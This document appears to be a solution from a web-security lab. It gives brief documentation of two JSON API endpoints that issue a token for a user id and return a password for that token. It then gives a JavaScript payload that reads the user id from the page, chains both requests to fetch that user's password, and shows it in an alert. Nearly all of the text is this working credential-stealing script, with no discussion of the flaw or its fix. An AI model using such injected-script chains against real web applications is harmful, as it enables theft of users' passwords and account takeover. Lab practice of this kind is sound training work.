JSON based API documentation

1. /lab/webapp/jfp/20/gettoken  GET request - params are uid = User Id


2. /lab/webapp/jfp/20/getpassword  GET request - params are token = token returned by API (1)

var uid = document.getElementById('settings').innerHTML.split(":")[1]
var xhttp2 = new XMLHttpRequest();
var xhttp = new XMLHttpRequest();
var passw = 0;
xhttp2.onreadystatechange = function() {
      if(this.readyState == 4 && this.status == 200){
        var json = JSON.parse(xhttp2.responseText);
        var token = json.params.token;
        xhttp.open("GET", '/lab/webapp/jfp/20/getpassword?token='+token, true)
        xhttp.responseType = "text";
        xhttp.send();
      }
}
xhttp2.open("GET", '/lab/webapp/jfp/20/gettoken?uid='+uid, true)
xhttp2.responseType = "text";
xhttp2.send();
setTimeout(function(){
  var json = JSON.parse(xhttp.responseText);
  alert(json.resp.password);
}, 2000);